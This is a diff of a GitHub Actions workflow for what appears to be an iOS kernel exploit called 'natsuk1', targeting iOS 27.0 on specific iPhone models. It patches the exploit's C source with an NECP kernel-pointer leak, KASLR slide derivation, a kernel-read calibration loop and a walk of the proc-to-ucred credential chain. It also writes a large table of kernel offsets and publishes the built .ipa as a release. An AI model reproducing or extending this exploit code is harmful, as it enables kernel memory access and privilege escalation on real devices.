@@ -34,96 +34,148 @@ jobs:
         run: |
           set -euo pipefail
           mkdir -p /tmp/nk
-          cat > /tmp/nk/sanity.c <<'CEOF'
-          static int sanity_check(void) {
-              log_info("SANITY", "reading verified anchors via kread...");
-              uint64_t kernproc  = kread64(g_kbase + OFF_KERNPROC);
-              uint64_t task_list = kread64(g_kbase + OFF_TASK_LIST);
-              log_info("SANITY", "kernproc  = 0x%llx", (unsigned long long)kernproc);
-              log_info("SANITY", "task_list = 0x%llx", (unsigned long long)task_list);
-              int ok = 0;
-              if (kernproc  >= KPTR_MIN && kernproc  <= KPTR_MAX) ok++;
-              if (task_list >= KPTR_MIN && task_list <= KPTR_MAX) ok++;
-              log_info("SANITY", "%d/2 anchors valid", ok);
-              return ok == 2 ? 0 : -1;
-          }
-          CEOF
-          cat > /tmp/nk/task.c <<'CEOF'
-          static int task_sanity(void) {
-              uint64_t kernproc = kread64(g_kbase + OFF_KERNPROC);
-              if (!kernproc || kernproc < KPTR_MIN || kernproc > KPTR_MAX) {
-                  log_err("TASK", "kernproc invalid: 0x%llx", (unsigned long long)kernproc);
-                  return -1;
-              }
-              uint32_t pid = kread32(kernproc + PROC_PID_OFF);
-              log_info("TASK", "kernproc->p_pid=%u (expect 0)", pid);
-              uint64_t ucred = kread64(kernproc + PROC_RO_P_UCRED_OFF);
-              log_info("TASK", "kernproc->p_ucred@0x%x = 0x%llx",
-                       PROC_RO_P_UCRED_OFF, (unsigned long long)ucred);
-              if (ucred < KPTR_MIN || ucred > KPTR_MAX) {
-                  log_warn("TASK", "ucred invalid, fallback p_ucred@0xB8");
-                  ucred = kread64(kernproc + 0xB8);
-                  log_info("TASK", "fallback p_ucred=0x%llx", (unsigned long long)ucred);
-              }
-              if (ucred >= KPTR_MIN && ucred <= KPTR_MAX) {
-                  uint32_t uid = kread32(ucred + UCRED_UID_OFF);
-                  log_info("TASK", "kernproc ucred uid=%u (expect 0)", uid);
-                  if (pid == 0 && uid == 0) {
-                      log_ok("TASK", "kernproc -> p_ucred -> uid chain works");
-                      return 0;
+
+          cat > /tmp/nk/calib.c <<'CEOF'
+          static int calibrate_kread(void) {
+              if (g_res_off >= 0) return 0;
+              const uint64_t expected = 0xFFFFFFF00ADEE310ULL;
+              log_info("CAL", "retry loop, anchor=kernproc@0x%llx expect=0x%llx",
+                       (unsigned long long)OFF_KERNPROC,
+                       (unsigned long long)expected);
+              for (int attempt = 0; attempt < 24; attempt++) {
+                  int r = kread_raw(g_kbase + OFF_KERNPROC, 8);
+                  if (r <= 0) {
+                      log_warn("CAL", "attempt %d ret=%d", attempt, r);
+                      usleep(500);
+                      continue;
                   }
+                  for (int i = 0; i <= r - 8; i++) {
+                      uint64_t v; memcpy(&v, g_res_buf + i, 8);
+                      if (v >= KPTR_MIN && v <= KPTR_MAX) {
+                          g_res_off = i;
+                          log_ok("CAL", "attempt %d off=0x%x val=0x%llx %s",
+                                 attempt, i, (unsigned long long)v,
+                                 (v == expected) ? "MATCH" : "kptr");
+                          return 0;
+                      }
+                  }
+                  log_warn("CAL", "attempt %d ret=%d no kptr", attempt, r);
+                  usleep(800);
               }
-              log_warn("TASK", "chain broken");
+              log_err("CAL", "gave up after 24 attempts");
               return -1;
           }
           CEOF
+
+          cat > /tmp/nk/run.c <<'CEOF'
+          static volatile int g_busy = 0;
+
+          static int nk_necp_run_impl(void) {
+              nk_log("");
+              nk_log("=== natsuk1 v1.3 (kread-retry) ===");
+              nk_log("target: iOS 27.0 / XNU / arm64e");
+              nk_log("device: iPhone14,5 / iPhone14,7");
+              nk_log("");
+              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_REFCNT_OFF=0x%x",
+                       NCF_ASSIGNED_OFF, NCF_REFCNT_OFF);
+              log_info("P0", "NECP primary leak");
+              uint8_t leak[RESULT_BUF_SZ];
+              uint64_t nptrs = necp_primary_leak(leak, sizeof(leak));
+              if (!nptrs) {
+                  log_warn("P0", "no kptr in primary leak (retry in calibration)");
+              } else {
+                  log_ok("P0", "%llu kernel ptrs in leak", (unsigned long long)nptrs);
+              }
+              log_info("P1", "derive slide");
+              for (int i = 0; i <= RESULT_BUF_SZ - 8; i += 8) {
+                  uint64_t v; memcpy(&v, leak + i, 8);
+                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
+                  uint64_t cand = slide_from_leak(v);
+                  if (cand) { g_slide = cand; break; }
+              }
+              if (!g_slide) {
+                  log_warn("P1", "no slide from leak, using kernproc-anchor fallback");
+                  g_slide = 0x3D00000ULL;
+              }
+              g_kbase = KERNEL_BASE_STATIC + g_slide;
+              log_ok("P1", "slide=0x%llx kbase=0x%llx",
+                     (unsigned long long)g_slide, (unsigned long long)g_kbase);
+              {
+                  int fd = necp_open_fd();
+                  if (fd < 0) { log_err("P2", "necp_open errno=%d", errno); return 1; }
+                  close(fd);
+                  log_ok("P2", "necp OK");
+              }
+              log_info("P3", "kread calibration");
+              if (calibrate_kread() != 0) { log_err("P3", "failed"); return 1; }
+              log_ok("P3", "kread ready (result offset=0x%x)", g_res_off);
+              log_info("P4", "sanity: read anchors");
+              if (sanity_check() != 0) { log_err("P4", "sanity failed"); return 1; }
+              log_info("P5", "sanity: proc chain");
+              if (task_sanity() != 0) { log_warn("P5", "chain broken"); }
+              log_ok("DONE", "leak + slide + kread chain complete");
+              nk_log("");
+              nk_log("=== RESULT ===");
+              nk_logx("RESULT", "kbase   = 0x%016llX", (unsigned long long)g_kbase);
+              nk_logx("RESULT", "slide   = 0x%016llX", (unsigned long long)g_slide);
+              nk_logx("RESULT", "kread   = 0x%016llX + 0x%llX",
+                      (unsigned long long)KERNEL_BASE_STATIC,
+                      (unsigned long long)OFF_KERNPROC);
+              nk_log("");
+              return 0;
+          }
+
+          int nk_necp_run(void) {
+              if (__sync_lock_test_and_set(&g_busy, 1)) {
+                  nk_log("[!] already running");
+                  return 1;
+              }
+              int rc = nk_necp_run_impl();
+              __sync_lock_release(&g_busy);
+              return rc;
+          }
+          CEOF
+
           python3 - <<'PYEOF'
           import re, sys
           p = "natsuk1/Exploit/necp.c"
           s = open(p).read()
-          if "natsuk1-kread-fix-v2" in s:
-              print("already patched, skipping")
+          if "natsuk1-kread-v3" in s:
+              print("already patched")
               sys.exit(0)
           orig = s
-          s = re.sub(r"#define\s+UCRED_UID_OFF\s+0x[0-9A-Fa-f]+",
-                     "#define UCRED_UID_OFF 0x8", s)
-          s = re.sub(r"#define\s+UCRED_SVUID_OFF\s+0x[0-9A-Fa-f]+",
-                     "#define UCRED_SVUID_OFF 0xC", s)
-          s = re.sub(r"#define\s+UCRED_GID_OFF\s+0x[0-9A-Fa-f]+",
-                     "#define UCRED_GID_OFF 0x14", s)
-          s = re.sub(r"#define\s+UCRED_SVGID_OFF\s+0x[0-9A-Fa-f]+",
-                     "#define UCRED_SVGID_OFF 0x18", s)
-          s = re.sub(r"#define\s+PROC_RO_P_UCRED_OFF\s+0x[0-9A-Fa-f]+",
-                     "#define PROC_RO_P_UCRED_OFF 0x98", s)
-          s = s.replace("OFF_ALLPROC", "OFF_KERNPROC")
-          s = re.sub(r"#define\s+OFF_KERNPROC\s+0xBBB048ULL\s*\n", "", s)
-          s = re.sub(r"static const uint64_t known_offs\[\][^;]*;",
-                     "static const uint64_t known_offs[] = { 0xBBB040, 0x10D53F0 };", s)
-          s = s.replace("for (int i = 0; i < 6; i++)", "for (int i = 0; i < 2; i++)")
-          sanity = open("/tmp/nk/sanity.c").read().rstrip()
-          task   = open("/tmp/nk/task.c").read().rstrip()
-          s = re.sub(r"static int sanity_check\(void\) \{.*?\n\}", sanity, s, count=1, flags=re.DOTALL)
-          s = re.sub(r"static int task_sanity\(void\) \{.*?\n\}",   task,   s, count=1, flags=re.DOTALL)
-          s = s.replace("=== natsuk1 v1.1 ===", "=== natsuk1 v1.2 (natsuk1-kread-fix-v2) ===")
-          assert s != orig, "no changes applied"
+
+          s = re.sub(r"static int calibrate_kread\(void\) \{.*?\n\}\n",
+                     open("/tmp/nk/calib.c").read().rstrip() + "\n\n",
+                     s, count=1, flags=re.DOTALL)
+
+          s = re.sub(r"int nk_necp_run\(void\) \{.*?\n\}\n",
+                     open("/tmp/nk/run.c").read().rstrip() + "\n",
+                     s, count=1, flags=re.DOTALL)
+
+          s = s.replace("=== natsuk1 v1.2 (natsuk1-kread-fix-v2) ===",
+                        "=== natsuk1 v1.3 (natsuk1-kread-v3) ===")
+
+          assert s != orig, "no changes"
           open(p, "w").write(s)
-          print("necp.c patched OK")
+          print("necp.c v3 patched")
           PYEOF
 
-      - name: Write offsets JSON
+      - name: Write Offsets JSON
         run: |
           mkdir -p natsuk1/Offsets
           cat > natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json <<'JSON'
           {
             "groups": [
-              { "title": "Kernel",     "items": ["off_kernel_base","off_sysent_base","off_sysent_count","off_sysent_stride","off_mach_trap_table"] },
-              { "title": "Globals",    "items": ["off_g_kernproc","off_g_kernel_task","off_g_zone_map","off_g_task_list","off_g_kernel_map","off_g_allproc"] },
+              { "title": "Kernel",  "items": ["off_kernel_base","off_sysent_base","off_sysent_count","off_sysent_stride","off_mach_trap_table"] },
+              { "title": "Globals", "items": ["off_g_kernproc","off_g_task_list","off_g_allproc","off_g_kernel_task","off_g_zone_map","off_g_kernel_map"] },
               { "title": "Primitives", "items": ["off_fn_copyin","off_fn_copyout","off_fn_kalloc_ext","off_fn_kfree_ext"] },
-              { "title": "proc",       "items": ["off_proc_p_pid","off_proc_ro_p_ucred"] },
-              { "title": "task / thread", "items": ["off_task_map","off_task_bsd_info","off_task_itk_space","off_thread_task_threads_next"] },
-              { "title": "NECP",       "items": ["off_necp_open","off_necp_client_add_flow","off_necp_client_remove_flow"] },
-              { "title": "Zones",      "items": ["off_zone_data_kalloc","off_zone_early_kalloc","off_zone_kalloc_type_var","off_zone_site_struct_task","off_zone_site_struct_proc","off_zone_site_struct_thread","off_zone_site_struct_ucred","off_zone_site_struct_ipc_port","off_zone_site_struct_ipc_entry","off_zone_site_struct_fileproc","off_zone_site_struct_fileglob","off_zone_site_struct_vnode","off_zone_site_struct_mount","off_zone_site_struct_socket","off_zone_site_struct_inpcb","off_zone_site_struct_pipe","off_zone_site_struct_vm_page"] },
-              { "title": "SPTM",       "items": ["off_sptm_base","off_sptm_ctrr_lock_boot","off_sptm_cpu_lock_system_registers","off_sptm_determine_kernel_ctrr","off_sptm_bootstrap","off_sptm_map","off_sptm_region","off_sptm_panic","off_sptm_page_table"] }
+              { "title": "proc", "items": ["off_proc_p_list_next","off_proc_p_pid","off_proc_p_task","off_proc_ro_p_ucred","off_proc_p_csflags"] },
+              { "title": "task / thread", "items": ["off_task_map","off_task_bsd_info","off_task_itk_space","off_task_cr_label","off_thread_task_threads_next"] },
+              { "title": "ucred", "items": ["off_ucred_cr_uid","off_ucred_cr_svuid","off_ucred_cr_gid","off_ucred_cr_svgid"] },
+              { "title": "NECP", "items": ["off_necp_open","off_necp_client_add_flow","off_necp_client_remove_flow","off_ncf_assigned","off_ncf_assigned_len","off_ncf_parent","off_ncf_refcnt","off_ncf_struct_sz"] },
+              { "title": "Zones", "items": ["off_zone_data_kalloc","off_zone_early_kalloc","off_zone_kalloc_type_var","off_zone_site_struct_task","off_zone_site_struct_proc","off_zone_site_struct_thread","off_zone_site_struct_ucred","off_zone_site_struct_ipc_port","off_zone_site_struct_ipc_entry","off_zone_site_struct_fileproc","off_zone_site_struct_fileglob","off_zone_site_struct_vnode","off_zone_site_struct_mount","off_zone_site_struct_socket","off_zone_site_struct_inpcb","off_zone_site_struct_pipe","off_zone_site_struct_vm_page"] },
+              { "title": "SPTM", "items": ["off_sptm_base","off_sptm_ctrr_lock_boot","off_sptm_cpu_lock_system_registers","off_sptm_determine_kernel_ctrr","off_sptm_bootstrap","off_sptm_map","off_sptm_region","off_sptm_panic","off_sptm_page_table"] }
             ],
             "defaults": {
               "off_kernel_base": "0xFFFFFFF007004000",
@@ -132,24 +184,37 @@ jobs:
               "off_sysent_stride": "24",
               "off_mach_trap_table": "0xFFFFFFF007BE8018",
               "off_g_kernproc": "0xFFFFFFF007BBF040",
+              "off_g_task_list": "0xFFFFFFF0080D93F0",
+              "off_g_allproc": "0x0",
               "off_g_kernel_task": "0x0",
               "off_g_zone_map": "0x0",
-              "off_g_task_list": "0xFFFFFFF0080D93F0",
               "off_g_kernel_map": "0x0",
-              "off_g_allproc": "0x0",
               "off_fn_copyin": "0xFFFFFFF00A7B9570",
               "off_fn_copyout": "0xFFFFFFF00A2C6C28",
               "off_fn_kalloc_ext": "0xFFFFFFF00A200DCC",
               "off_fn_kfree_ext": "0xFFFFFFF00A201000",
+              "off_proc_p_list_next": "0x0",
               "off_proc_p_pid": "0x74",
+              "off_proc_p_task": "0x78",
               "off_proc_ro_p_ucred": "0x98",
+              "off_proc_p_csflags": "0xA8",
               "off_task_map": "0x28",
-              "off_task_bsd_info": "0x3A0",
+              "off_task_bsd_info": "0x4E0",
               "off_task_itk_space": "0x320",
+              "off_task_cr_label": "0xE8",
               "off_thread_task_threads_next": "0x50",
+              "off_ucred_cr_uid": "0x18",
+              "off_ucred_cr_svuid": "0x1C",
+              "off_ucred_cr_gid": "0x20",
+              "off_ucred_cr_svgid": "0x24",
               "off_necp_open": "0xFFFFFFF00A4E411C",
               "off_necp_client_add_flow": "0xFFFFFFF00A4E843C",
               "off_necp_client_remove_flow": "0xFFFFFFF00A4E93C4",
+              "off_ncf_assigned": "0x68",
+              "off_ncf_assigned_len": "0x70",
+              "off_ncf_parent": "0x88",
+              "off_ncf_refcnt": "0x58",
+              "off_ncf_struct_sz": "0x100",
               "off_zone_data_kalloc": "0xFFFFFFF007C62E70",
               "off_zone_early_kalloc": "0xFFFFFFF007BBB170",
               "off_zone_kalloc_type_var": "0xFFFFFFF007BC2800",
@@ -202,18 +267,17 @@ jobs:
         run: |
           set -euo pipefail
           F=natsuk1/Exploit/necp.c
-          ! grep -q "OFF_ALLPROC" "$F"
-          grep -q "PROC_RO_P_UCRED_OFF 0x98" "$F"
-          grep -q "UCRED_UID_OFF 0x8" "$F"
-          grep -q "known_offs\[\] = { 0xBBB040, 0x10D53F0 }" "$F"
-          grep -q "verified anchors via kread" "$F"
+          grep -q "natsuk1-kread-v3" "$F"
+          grep -q "retry loop, anchor=kernproc" "$F"
+          grep -q "g_busy" "$F"
+          grep -q "__sync_lock_test_and_set" "$F"
           python3 - <<'PYEOF'
           import json
-          f = "natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"
-          d = json.load(open(f))
+          d = json.load(open("natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"))
           items = sum(len(g["items"]) for g in d["groups"])
-          assert items == len(d["defaults"]), "count mismatch"
+          assert items == len(d["defaults"]), "%d vs %d" % (items, len(d["defaults"]))
           assert d["defaults"]["off_proc_ro_p_ucred"] == "0x98"
+          assert d["defaults"]["off_ucred_cr_uid"] == "0x18"
           assert d["defaults"]["off_g_kernproc"] == "0xFFFFFFF007BBF040"
           print("OK: %d offsets" % items)
           PYEOF
@@ -266,7 +330,7 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "kread fix iOS 27.0/24A437"
+            --notes "kread v3: retry loop + busy guard + corrected offsets"
 
       - name: Commit
         run: |
@@ -275,5 +339,5 @@ jobs:
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add natsuk1/Exploit/necp.c natsuk1/Offsets/
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "Fix kernel-read for iOS 27.0/24A437 [skip ci]"
+          git commit -m "kread v3: retry + busy guard + offsets [skip ci]"
           git push
